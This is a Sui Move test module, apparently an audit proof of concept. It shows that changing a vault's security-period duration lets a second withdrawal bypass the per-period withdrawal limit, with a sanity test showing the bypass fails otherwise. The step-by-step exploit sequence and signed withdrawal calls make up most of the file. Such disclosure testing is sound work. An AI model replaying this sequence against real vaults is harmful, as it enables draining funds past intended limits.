#[test_only, allow(unused_const, unused_use, unused_variable, deprecated_usage)]
module dvault::poc_test {
    use dvault::active_vault::{Self, ActiveVault, Config, OwnerCap as DvaultOwnerCap};
    use dvault::dvault_manage;
    use dvault::secure_vault::{Self, SecureVault};
    use dvault::sui_test::{Self, SUI_TEST};
    use dvault::usdc_test::{Self, USDC_TEST};
    use dvault::user_entry;
    use sui::clock::{Self, Clock};
    use sui::coin::{Self, CoinMetadata, Coin};
    use sui::test_scenario::{Self, Scenario};

    const OWNER: address = @0xa;
    const ALICE: address = @0xa;
    const BOB: address = @0xb;

    // Real developer public keys for Ed25519 validation
    const PK1: vector<u8> = x"b9c6ee1630ef3e711144a648db06bbb2284f7274cfbee53ffcee503cc1a49200";
    const PK2: vector<u8> = x"f1a756ceb2955f680ab622c9c271aa437a22aa978c34ae456f24400d6ea7ccdd";

    // Initialize vault with strict signer threshold
    public fun init_dvault(scenario_mut: &mut Scenario) {
        let owner = test_scenario::sender(scenario_mut);

        test_scenario::next_tx(scenario_mut, owner);
        {
            sui_test::init_for_testing(scenario_mut.ctx());
            usdc_test::init_for_testing(scenario_mut.ctx());
            active_vault::init_for_testing(scenario_mut.ctx());
            secure_vault::init_for_testing(scenario_mut.ctx());
        };

        // Create SUI vault
        test_scenario::next_tx(scenario_mut, owner);
        {
            let cap = test_scenario::take_from_sender<DvaultOwnerCap>(scenario_mut);
            let mut cfg = test_scenario::take_shared<Config>(scenario_mut);
            let meta = test_scenario::take_immutable<CoinMetadata<SUI_TEST>>(scenario_mut);

            dvault_manage::create_vault<SUI_TEST>(
                &cap,
                &mut cfg,
                &meta,
                2_000000000,
                1_000000000,
                scenario_mut.ctx(),
            );

            test_scenario::return_to_sender(scenario_mut, cap);
            test_scenario::return_shared(cfg);
            test_scenario::return_immutable(meta);
        };

        // Add signers
        test_scenario::next_tx(scenario_mut, owner);
        {
            let cap = test_scenario::take_from_sender<DvaultOwnerCap>(scenario_mut);
            let mut cfg = test_scenario::take_shared<Config>(scenario_mut);

            dvault_manage::add_signer(&cap, &mut cfg, PK1, 1);
            dvault_manage::add_signer(&cap, &mut cfg, PK2, 2);

            std::debug::print(&b"[LOG] Signers added");

            test_scenario::return_to_sender(scenario_mut, cap);
            test_scenario::return_shared(cfg);
        };
    }

    // Epoch drift allows withdrawal limit bypass
    #[test]
    public fun poc_finding1_epoch_key_drift_allows_double_withdraw() {
        let mut scenario = test_scenario::begin(OWNER);
        let s = &mut scenario;

        init_dvault(s);

        // Fund vault
        test_scenario::next_tx(s, OWNER);
        {
            let cfg = test_scenario::take_shared<Config>(s);
            let mut vault = test_scenario::take_shared<ActiveVault<SUI_TEST>>(s);
            let mut svault = test_scenario::take_shared<SecureVault<SUI_TEST>>(s);

            let coin = coin::mint_for_testing<SUI_TEST>(100_000000000, s.ctx());

            user_entry::deposit<SUI_TEST>(
                &cfg,
                &mut vault,
                &mut svault,
                coin,
                100_000000000,
                s.ctx(),
            );

            std::debug::print(&b"[LOG] Vault funded with 100 SUI");

            test_scenario::return_shared(vault);
            test_scenario::return_shared(svault);
            test_scenario::return_shared(cfg);
        };

        // Add security period
        test_scenario::next_tx(s, OWNER);
        {
            let cap = test_scenario::take_from_sender<DvaultOwnerCap>(s);
            let cfg = test_scenario::take_shared<Config>(s);
            let mut vault = test_scenario::take_shared<ActiveVault<SUI_TEST>>(s);

            dvault_manage::add_security_period<SUI_TEST>(
                &cap,
                &mut vault,
                &cfg,
                1,
                1_000000000,
                s.ctx(),
            );

            std::debug::print(&b"[LOG] Security period added");

            test_scenario::return_to_sender(s, cap);
            test_scenario::return_shared(vault);
            test_scenario::return_shared(cfg);
        };

        // Withdraw #1
        test_scenario::next_tx(s, ALICE);
        {
            let cfg = test_scenario::take_shared<Config>(s);
            let mut vault = test_scenario::take_shared<ActiveVault<SUI_TEST>>(s);
            let mut clock = clock::create_for_testing(s.ctx());

            clock.increment_for_testing(1);

            let mut sigs = vector::empty<vector<u8>>();

            sigs.push_back(x"934af97390500d06e49e86445bad588468b14e6db8a123b5614084f425bc4e6dcd466525eeec958e4620981ad5bd39c65b8d3e80791aec8fcabf704392bde400");
            sigs.push_back(x"0639a5b662199790b59a092e77f57608951730273814c30a7ed70ae5752cec9b7421803d4ec300b7ef6512dd309b6b76fab7387953ce7c0e708c090ab76d4e03");

            let msg1 = active_vault::keccak_message<SUI_TEST>(
                1,
                1,
                ALICE,
                1_000000000,
                BOB,
                b"aaaa"
            );

            std::debug::print(&b"[LOG] Withdraw #1 message hash");
            std::debug::print(&msg1);

            user_entry::withdraw(
                &clock,
                &cfg,
                &mut vault,
                1,
                1,
                1_000000000,
                BOB,
                sigs,
                b"aaaa",
                s.ctx(),
            );

            std::debug::print(&b"[LOG] Withdraw #1 success");

            test_scenario::return_shared(vault);
            test_scenario::return_shared(cfg);

            clock::destroy_for_testing(clock);
        };

        // Update security duration
        test_scenario::next_tx(s, OWNER);
        {
            let cap = test_scenario::take_from_sender<DvaultOwnerCap>(s);
            let cfg = test_scenario::take_shared<Config>(s);
            let mut vault = test_scenario::take_shared<ActiveVault<SUI_TEST>>(s);

            let pid = dvault::active_vault::get_security_period_id(&vault, 0);

            dvault_manage::update_security_period<SUI_TEST>(
                &cap,
                &mut vault,
                &cfg,
                pid,
                2,
                1_000000000,
            );

            std::debug::print(&b"[LOG] Security duration updated from 1ms to 2ms");

            test_scenario::return_to_sender(s, cap);
            test_scenario::return_shared(vault);
            test_scenario::return_shared(cfg);
        };

        // Withdraw #2
        test_scenario::next_tx(s, ALICE);
        {
            let cfg = test_scenario::take_shared<Config>(s);
            let mut vault = test_scenario::take_shared<ActiveVault<SUI_TEST>>(s);
            let mut clock = clock::create_for_testing(s.ctx());

            clock.increment_for_testing(1);

            let mut sigs = vector::empty<vector<u8>>();

            sigs.push_back(x"8b5237d1bfd06639f5dda35a187eb1e6a57ca8b6dd7556d7c04d4e6f9ecfad8bd36a04a2c87c7b58f20bd65656ee3c2e246fadf1919f720f06677093861ea809");
            sigs.push_back(x"b673ed88465f93550a5961adb4840947918ceb63f5ec534d3c3819555e86434d5578eb7b78f59229e377b4c368641b1302e2188cb27fcf0c1a2d3e5f114c120f");

            let msg2 = active_vault::keccak_message<SUI_TEST>(
                2,
                86400001,
                ALICE,
                1_000000000,
                BOB,
                b"aaaa"
            );

            std::debug::print(&b"[LOG] Withdraw #2 message hash");
            std::debug::print(&msg2);

            user_entry::withdraw(
                &clock,
                &cfg,
                &mut vault,
                2,
                86400001,
                1_000000000,
                BOB,
                sigs,
                b"aaaa",
                s.ctx(),
            );

            let vault_balance = dvault::active_vault::balance_value(&vault);

            std::debug::print(&b"[LOG] Withdraw #2 success");
            std::debug::print(&vault_balance);

            assert!(vault_balance == 98_000000000, 200);

            test_scenario::return_shared(vault);
            test_scenario::return_shared(cfg);

            clock::destroy_for_testing(clock);
        };

        test_scenario::end(scenario);
    }

    // Second withdrawal must fail without duration update
    #[test]
    #[expected_failure(
        abort_code = dvault::active_vault::EWITHDRAWAL_AMOUNT_OVERFLOW,
        location = dvault::active_vault
    )]
    public fun sanity_second_withdraw_same_epoch_fails_without_duration_change() {
        let mut scenario = test_scenario::begin(OWNER);
        let s = &mut scenario;

        init_dvault(s);

        // Fund vault
        test_scenario::next_tx(s, OWNER);
        {
            let cfg = test_scenario::take_shared<Config>(s);
            let mut vault = test_scenario::take_shared<ActiveVault<SUI_TEST>>(s);
            let mut svault = test_scenario::take_shared<SecureVault<SUI_TEST>>(s);

            let coin = coin::mint_for_testing<SUI_TEST>(100_000000000, s.ctx());

            user_entry::deposit<SUI_TEST>(
                &cfg,
                &mut vault,
                &mut svault,
                coin,
                100_000000000,
                s.ctx(),
            );

            std::debug::print(&b"[LOG] Sanity vault funded");

            test_scenario::return_shared(vault);
            test_scenario::return_shared(svault);
            test_scenario::return_shared(cfg);
        };

        // Add security period
        test_scenario::next_tx(s, OWNER);
        {
            let cap = test_scenario::take_from_sender<DvaultOwnerCap>(s);
            let cfg = test_scenario::take_shared<Config>(s);
            let mut vault = test_scenario::take_shared<ActiveVault<SUI_TEST>>(s);

            dvault_manage::add_security_period<SUI_TEST>(
                &cap,
                &mut vault,
                &cfg,
                1,
                1_000000000,
                s.ctx(),
            );

            std::debug::print(&b"[LOG] Sanity security period added");

            test_scenario::return_to_sender(s, cap);
            test_scenario::return_shared(vault);
            test_scenario::return_shared(cfg);
        };

        // Withdraw #1
        test_scenario::next_tx(s, ALICE);
        {
            let cfg = test_scenario::take_shared<Config>(s);
            let mut vault = test_scenario::take_shared<ActiveVault<SUI_TEST>>(s);
            let mut clock = clock::create_for_testing(s.ctx());

            clock.increment_for_testing(1);

            let mut sigs = vector::empty<vector<u8>>();

            sigs.push_back(x"934af97390500d06e49e86445bad588468b14e6db8a123b5614084f425bc4e6dcd466525eeec958e4620981ad5bd39c65b8d3e80791aec8fcabf704392bde400");
            sigs.push_back(x"0639a5b662199790b59a092e77f57608951730273814c30a7ed70ae5752cec9b7421803d4ec300b7ef6512dd309b6b76fab7387953ce7c0e708c090ab76d4e03");

            user_entry::withdraw(
                &clock,
                &cfg,
                &mut vault,
                1,
                1,
                1_000000000,
                BOB,
                sigs,
                b"aaaa",
                s.ctx(),
            );

            std::debug::print(&b"[LOG] Sanity withdraw #1 success");

            test_scenario::return_shared(vault);
            test_scenario::return_shared(cfg);

            clock::destroy_for_testing(clock);
        };

        // Withdraw #2 should fail
        test_scenario::next_tx(s, ALICE);
        {
            let cfg = test_scenario::take_shared<Config>(s);
            let mut vault = test_scenario::take_shared<ActiveVault<SUI_TEST>>(s);
            let mut clock = clock::create_for_testing(s.ctx());

            clock.increment_for_testing(1);

            let mut sigs = vector::empty<vector<u8>>();

            sigs.push_back(x"8b5237d1bfd06639f5dda35a187eb1e6a57ca8b6dd7556d7c04d4e6f9ecfad8bd36a04a2c87c7b58f20bd65656ee3c2e246fadf1919f720f06677093861ea809");
            sigs.push_back(x"b673ed88465f93550a5961adb4840947918ceb63f5ec534d3c3819555e86434d5578eb7b78f59229e377b4c368641b1302e2188cb27fcf0c1a2d3e5f114c120f");

            std::debug::print(&b"[LOG] Sanity withdraw #2 should fail");

            user_entry::withdraw(
                &clock,
                &cfg,
                &mut vault,
                2,
                86400001,
                1_000000000,
                BOB,
                sigs,
                b"aaaa",
                s.ctx(),
            );

            test_scenario::return_shared(vault);
            test_scenario::return_shared(cfg);

            clock::destroy_for_testing(clock);
        };

        test_scenario::end(scenario);
    }
}